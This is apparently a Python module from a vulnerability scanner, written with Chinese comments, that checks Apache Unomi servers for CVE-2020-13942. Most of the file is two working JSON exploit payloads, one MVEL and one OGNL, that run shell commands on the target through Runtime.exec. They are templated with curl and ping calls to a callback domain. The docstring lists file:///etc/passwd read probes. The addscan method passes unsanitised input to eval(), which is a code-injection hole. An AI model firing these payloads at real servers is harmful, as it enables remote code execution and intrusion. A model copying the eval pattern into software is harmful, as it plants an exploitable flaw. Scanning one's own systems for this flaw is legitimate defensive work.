#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Apache Unomi 是一个基于标准的客户数据平台(CDP, Customer Data Platform)
用于管理在线客户和访客等信息, 以提供符合访客隐私规则的个性化体验
    ApacheUnomi扫描类: 
        Apache Unomi 远程表达式代码执行
            CVE-2020-13942
                Payload: https://vulhub.org/#/environments/unomi/CVE-2020-13942/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.thread import thread
from payloads.ApacheUnomi.cve_2020_13942 import cve_2020_13942_scan

class ApacheUnomi():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheUnomi'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        cve_2020_13942_payload_mvel = '''{
    "filters": [
        {
            "id": "sample",
            "filters": [
                {
                    "condition": {
                         "parameterValues": {
                            "": "script::Runtime r = Runtime.getRuntime(); r.exec(\\"COMMANDDNSDOMAIN\\");"
                        },
                        "type": "profilePropertyCondition"
                    }
                }
            ]
        }
    ],
    "sessionId": "sample"
}'''

        cve_2020_13942_payload_ognl = '''{
  "personalizations":[
    {
      "id":"gender-test",
      "strategy":"matching-first",
      "strategyOptions":{
        "fallback":"var2"
      },
      "contents":[
        {
          "filters":[
            {
              "condition":{
                "parameterValues":{
                  "propertyName":"(#runtimeclass = #this.getClass().forName(\\"java.lang.Runtime\\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\\"getRuntime\\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\\"exec\\")}.{? #this.getParameters()[0].getType().getName().equals(\\"java.lang.String\\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\\"COMMANDDNSDOMAIN\\"))",
                  "comparisonOperator":"equals",
                  "propertyValue":"male"
                },
                "type":"profilePropertyCondition"
              }
            }
          ]
        }
      ]
    }
  ],
  "sessionId":"sample"
}'''

        self.cve_2020_13942_payloads = [
            # ! MVEL表达式
            {
                'path': 'context.json',
                'data': cve_2020_13942_payload_mvel.replace('COMMAND', 'curl ')
            },
            {
                'path': 'context.json',
                'data': cve_2020_13942_payload_mvel.replace('COMMAND', 'curl http://')
            },
            {
                'path': 'context.json',
                'data': cve_2020_13942_payload_mvel.replace('COMMAND', 'ping -c 4 ')
            },
            {
                'path': 'context.json',
                'data': cve_2020_13942_payload_mvel.replace('COMMAND', 'ping ')
            },
            # ! OGNL表达式
            {
                'path': 'context.json',
                'data': cve_2020_13942_payload_ognl.replace('COMMAND', 'curl ')
            },
            {
                'path': 'context.json',
                'data': cve_2020_13942_payload_ognl.replace('COMMAND', 'curl http://')
            },
            {
                'path': 'context.json',
                'data': cve_2020_13942_payload_ognl.replace('COMMAND', 'ping -c 4 ')
            },
            {
                'path': 'context.json',
                'data': cve_2020_13942_payload_ognl.replace('COMMAND', 'ping ')
            },
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_13942_scan, url=url)
        ]

ApacheUnomi.cve_2020_13942_scan = cve_2020_13942_scan

apacheunomi = ApacheUnomi()
